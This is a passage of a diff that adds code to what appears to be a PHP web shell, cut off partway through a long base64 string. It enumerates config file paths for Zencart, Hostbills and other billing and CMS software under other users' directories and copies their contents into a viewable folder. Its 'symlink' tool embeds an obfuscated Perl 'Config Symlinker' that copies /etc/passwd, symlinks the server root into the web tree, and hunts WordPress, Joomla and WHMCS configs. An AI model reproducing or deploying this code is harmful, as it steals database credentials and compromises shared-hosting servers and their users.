+						"$user_docroot/shop/includes/dist-configure.php" => "Zencart",
+						"$user_docroot/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/host/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/Host/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/support/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/cart/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/order/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/client/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/clients/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/billing/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/billings/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/my/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/secure/includes/iso4217.php" => "Hostbills",
+						"$user_docroot/support/order/includes/iso4217.php" => "Hostbills"
+
+					);
+					foreach($getconfig as $config => $userconfig) {
+						$get = file_get_contents($config);
+						if($get == '') {
+						}
+						else {
+							$fopen = fopen("idx_config/$user-$userconfig.txt", "w");
+							fputs($fopen, $get);
+						}
+					}
+				}
+			}
+		}
+		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
+		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'><iframe>";
+		print "</div>";
+	}
+	elseif($toolsname === "symlink") {
+		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_sym'."));
+		if(!is_dir(path()."/idx_sym/")) {
+			$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxOTk5DQojCQlUaGFua3MgVG8gOiAweElEaW90ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1JTUU6OkJhc2U2NDsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJpZHhfc3ltIjsNCnN5bWxpbmsoIi8iLCJpZHhfc3ltL3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFlTRlJOVENBclNGUk5URlJoWW14bElDdFRkWEJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMyTnlhWEIwYVc5dUlDdE9ZVzFsVjJsa2RHZzlLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJTVU5CWjBsbVFXaHJhVUZCUVVGQmJIZFRSbXg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpvTUZVeU9XMWtTR1JvWTIxVlFXUXpaRE5NYld4MVlUTk9hbGxZUW14TWJUbDVXalYyZFZCQ2IwRkJRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdITnlWekJIZDBWUmRGSjNWa3ROVW5SQlZUaGFZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSWTNjMlJFWkJMMVZFVlVGQldVaElhamhvVDBGVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFYTk1WbU52YlZwTFJGQTJNV3RGVEdsb1IwbEtPVkZDWjA4eWFtUnpTVVV2U21JMVQyRmpSMFpCZDBSUlJXVk5SVTlhYm1neFJYRk5RMmgwVTBJNFlUWTBRbGN5VFU1b04xRldhV2hEUjB0alRraHpkMjFhTUd4QmExbEllRVkwVVdoQ1VFTkxTVmxTVlRsc05qQTFTMjFIUTBWSlZWbDZkRU5aVFVKbWEwVnFSMW8wVDJsSWQxSlJSaXQyYTFGSEszQjBRVU5KUmxKRlNsWlFVVUYyUm1ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkwTEdsV1FrOVNkekJMUjJkdlFVRkJRVTVUVldoRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXWTRMemxvUVVGQlFVRllUbE5TTUVsQmNuTTBZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01GTlZNVVpDT1c5S1FtaGpWRXAyTWtJeVpEUkJRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJOTXpoQ1RtZEtVVzFSWjBwSFpDdEJMMDFSUWt4M1IycHBkMGd6Ym5ka2ExTk1kRTh5ZUVWU1J6Vk1jWGhZVWxOSlVqSlpSR1pFTkVkclIwMHdVRE55WWpSaU9WQkJlakJzTjNCVGJGZHNWekJtYm01TWIyeEJTVkJDTkZCWWFEUmxSblZ1ZFdOQlNVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWhTS3k4dmVuWktUWHBUZVVwTFMyOWthVWxuT0VGWVlYaGxTWG94WWtSYU4wMTRjVTVtZEdkVFZWSkVWM2szVEZWdVdqQmtXVzE0UVVaQlZrVnNTVFpCUlVONVowbHpVVkZ6YVhwTVFrOUJRa0ZFVDJwTFFYQnhhRGQxTjBkdlExVlhhWGRaWW1WMGIxVkljbkpRWTNkRGNXOUdNa3RWWlZoTWVrVjZRbll3SzNWUmJWTklUVVZhT1VZMlUxcGpjalpwTkVselFrOWhMMkkzU0ZGTllVaDBTVUYzWjB4a1NHRnNSRUV4WlhZd1pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF4TXpKdFRXdEtjbWsxZFZOUGJFWm9SV2h3VlZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhKTkhaaFpXOWhWbGd3WTJKVFpHaHRWVkl6ZWtGTGRrNXFXVFpXYVc5dk1IUlhlbWRGYjI1TFlsY3JTMnRIVjNRelZXNTBNRU5sUjJaS2N6bG5LMVZWTUhKRlIwaElMMGgzTDAxcVNEWXZWQ3RRVDJSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxRTJTSEJPVVRJM2REWnpRVU5FVTA1aGJubHZiR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0zTDA5RWF6VkhZU3RaTms4MVRYRjViVTUzTTFZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JYTXJjWFpuTkU5RWVqaG1TSGd3TDB4elltVXpPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT05TOU9NRmRhWW5Sc2VUbG1NRGx1V2pKYUwySXlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNVTkRSamt2VUZSd1EyeG9jRUoyWjFCbGJHOU1PVlUxTlU1SlFVRkJRVUZCVTFWV1QxSkxOVU5aU1VrOUp3MEtTVzVrWlhoSloyNXZjbVVnS2k1MGVIUTBNRFFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMzTW5EUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCcGJtUnZlSEJzYjJsMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VERTVPVGt1ZEhoMERRcFRZWFJwYzJaNUlFRnVlUTBLU1c1a1pYaFBjSFJwYjI1eklFbG5ibTl5WlVOaGMyVWdSbUZ1WTNsSmJtUmxlR2x1WnlCR2IyeGtaWEp6Um1seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQTZMeTlsZG1WdWRDNXBibVJ2ZUhCc2IybDBMbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2lkeF9zeW0vLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdpZHhfc3ltL25lbXUudHh0Jyk7DQpwcmludCAkeHggIiRzeW0iOw0KY2xvc2UgJHh4Ow0Kb3BlbihteSAkZmgsICc8OmVuY29kaW5nKFVURi04KScsICRmaWxlbmFtZSk7DQp3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7DQpteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7DQpteSAkdXNlcm55YSA9ICQxOw0KbXkgQGFycmF5ID0gKA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy8uYWNjZXNzaGFzaCcsIHR5cGUgPT4gJ1dITS1hY2Nlc3NoYXNoJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywgdHlwZSA9PiAnT3BlbkNhcnQnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jczEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0FSVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvT1JERVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UQVJFQS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlI